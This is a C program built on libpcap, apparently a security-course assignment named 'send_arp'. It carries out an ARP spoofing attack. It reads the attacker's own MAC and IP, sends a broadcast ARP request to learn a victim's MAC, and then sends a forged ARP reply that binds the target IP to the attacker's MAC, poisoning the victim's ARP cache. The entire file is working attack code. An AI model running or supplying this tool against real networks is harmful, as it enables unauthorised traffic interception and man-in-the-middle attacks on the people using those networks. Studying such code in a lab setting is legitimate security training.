#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>
#include<pcap.h>
#include<netinet/if_ether.h>
#include<sys/types.h>
#include<sys/socket.h>
#include<sys/ioctl.h>
#include<net/if.h>
#include<string.h>
#include<stdint.h>
#include<arpa/inet.h>
#include<netinet/in.h>

#define ETH_HW_ADDR_LEN 6
#define IP_ADDR_LEN 4

struct arp_packet{
    u_char targ_hw_addr[ETH_HW_ADDR_LEN];
    u_char src_hw_addr[ETH_HW_ADDR_LEN];
    u_short ether_type;                     //ethernet header

    u_int16_t hw_type;
    u_int16_t prot_type;
    u_int8_t hw_addr_size;
    u_int8_t prot_addr_size;
    u_int16_t op;
    u_int8_t sndr_hw_addr[ETH_HW_ADDR_LEN];
    u_int8_t sndr_ip_addr[IP_ADDR_LEN];
    u_int8_t rcpt_hw_addr[ETH_HW_ADDR_LEN];
    u_int8_t rcpt_ip_addr[IP_ADDR_LEN];
};

void make_arp(u_int8_t *packet, u_int8_t *src_mac, u_int8_t *dst_mac, u_int8_t *src_ip, u_int8_t *dst_ip, u_int16_t opcode){
    struct arp_packet *arp;
    arp = (struct arp_packet *)malloc(sizeof(struct arp_packet));
        
    arp->ether_type      = htons(0x0806);
    arp->hw_type         = htons(1);
    arp->prot_type       = htons(0x0800);
    arp->hw_addr_size    = ETH_HW_ADDR_LEN;
    arp->prot_addr_size  = IP_ADDR_LEN;
    arp->op              = htons(opcode);

    memcpy(arp->targ_hw_addr, dst_mac, ETH_HW_ADDR_LEN);
    memcpy(arp->src_hw_addr, src_mac, ETH_HW_ADDR_LEN);

    memcpy(arp->rcpt_hw_addr, dst_mac, ETH_HW_ADDR_LEN);
    memcpy(arp->sndr_hw_addr, src_mac, ETH_HW_ADDR_LEN);
    memcpy(arp->rcpt_ip_addr, dst_ip, IP_ADDR_LEN);
    memcpy(arp->sndr_ip_addr, src_ip, IP_ADDR_LEN);
    memcpy(packet, arp, sizeof(struct arp_packet));
    free(arp);
}

int main(int argc, char *argv[]){
    pcap_t *handler;
    char errbuf[PCAP_ERRBUF_SIZE];
    struct pcap_pkthdr *header;
    const char *interface = argv[1];
    u_int8_t sender_mac[ETH_HW_ADDR_LEN];
    u_int8_t sender_ip[IP_ADDR_LEN];
    u_int8_t target_mac[ETH_HW_ADDR_LEN];
    u_int8_t target_ip[IP_ADDR_LEN];
    u_int8_t attacker_mac[ETH_HW_ADDR_LEN];
    u_int8_t attacker_ip[IP_ADDR_LEN];
    u_int8_t broadcast_mac[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
    u_int8_t packet[60];
    int length = 60;

    const u_char *packet_recv;
    struct arp_packet *arp;
    struct ifreq ifr;
    int sock = socket(AF_INET, SOCK_DGRAM, 0);

    const char *name = "Kim Subong";
    printf("[sub26_2017]send_arp[%s]\n", name);
    
    handler = pcap_open_live(interface, BUFSIZ, 1, 1000, errbuf);
    if(handler == NULL){
        printf("%s\n", errbuf);
        return -1;
    }

    inet_pton(AF_INET, argv[2], sender_ip);
    inet_pton(AF_INET, argv[3], target_ip);
    
    //get mac, ip of attacker
    strcpy(ifr.ifr_name, interface);
    if(ioctl(sock, SIOCGIFHWADDR, &ifr) == 0 && ioctl(sock, SIOCGIFADDR, &ifr) == 0){
        for(int i = 0;i<6;i++) attacker_mac[i] = ifr.ifr_hwaddr.sa_data[i];
        memcpy(attacker_ip, &((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr, IP_ADDR_LEN);
        close(sock);
    }
    
    //print mac, ip
    printf("Attacker's MAC: %02x:%02x:%02x:%02x:%02x:%02x\n", attacker_mac[0], attacker_mac[1], attacker_mac[2], attacker_mac[3], attacker_mac[4], attacker_mac[5]);    
    printf("Attacker's IP :%d.%d.%d.%d\n", attacker_ip[0], attacker_ip[1], attacker_ip[2], attacker_ip[3]);  

    make_arp(packet, attacker_mac, broadcast_mac, attacker_ip, sender_ip, 1); //arp broadcast
    printf("arp broadcasted\n");

    if(pcap_sendpacket(handler, packet, length) != 0){
        printf("\nError sending the packet\n");
        return -1;
    }
    
    while(1){                                                                //get arp reply
        pcap_next_ex(handler, &header, &packet_recv);
        arp = (struct arp_packet*)packet_recv;
        if(ntohs(arp->ether_type) == ETHERTYPE_ARP && ntohs(arp->op) == 2) break;
    }
    printf("arp replied\n");
    
    memcpy(sender_mac, arp->sndr_hw_addr, ETH_HW_ADDR_LEN);
    printf("Sender's MAC ADDR : ");
    printf("%02x:%02x:%02x:%02x:%02x:%02x\n", sender_mac[0], sender_mac[1], sender_mac[2], sender_mac[3], sender_mac[4], sender_mac[5]);

    make_arp(packet, attacker_mac, sender_mac, target_ip, sender_ip, 2);     //request arp to target
    printf("arp trasnlated\n");
    
    if(pcap_sendpacket(handler, packet, length) != 0){
        printf("\nError sending the packet\n");
        return -1;
    }    
    return 0;
}

